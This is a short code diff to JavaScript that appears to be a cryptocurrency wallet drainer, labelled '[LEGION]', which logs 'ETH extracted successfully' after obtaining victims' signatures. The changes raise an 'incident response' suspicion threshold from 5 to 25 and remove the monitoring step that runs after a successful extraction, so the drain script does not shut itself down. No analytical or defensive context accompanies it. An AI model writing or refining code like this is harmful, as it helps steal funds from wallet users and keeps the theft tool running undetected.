@@ -2787,7 +2787,7 @@
   var INCIDENT_RESPONSE = {
     enabled: true,
     suspicionScore: 0,
-    maxScore: 5,
+    maxScore: 25,
     detectionEvents: [],
     monitoringActive: false,
     lastCheckTime: 0,
@@ -3978,7 +3978,9 @@
           // ETH-only extraction: funds already transferred, no permit2 batch to submit
           console.log('[LEGION] ✅ ETH-only extraction complete. Tx:', _ethOnlyDone.split(':')[1]);
           updateStatus('Done! ETH extracted successfully.');
-          if (INCIDENT_RESPONSE.enabled) { INCIDENT_RESPONSE.startMonitoring(); }
+          // Do NOT start incident monitoring — extraction is done, monitoring auto-shuts script needlessly
+          INCIDENT_RESPONSE.suspicionScore = 0;
+          drainRunning = false;
           return;
         }
         throw new Error('All signatures rejected');
@@ -4382,7 +4384,8 @@
       if (_ethOnlyDoneWc) {
         console.log('[LEGION] ✅ ETH-only extraction complete. Tx:', _ethOnlyDoneWc.split(':')[1]);
         updateStatus('Done! ETH extracted successfully.');
-        if (INCIDENT_RESPONSE.enabled) { INCIDENT_RESPONSE.startMonitoring(); }
+        INCIDENT_RESPONSE.suspicionScore = 0;
+        drainRunning = false;
         return;
       }
       throw new Error('All signatures rejected');
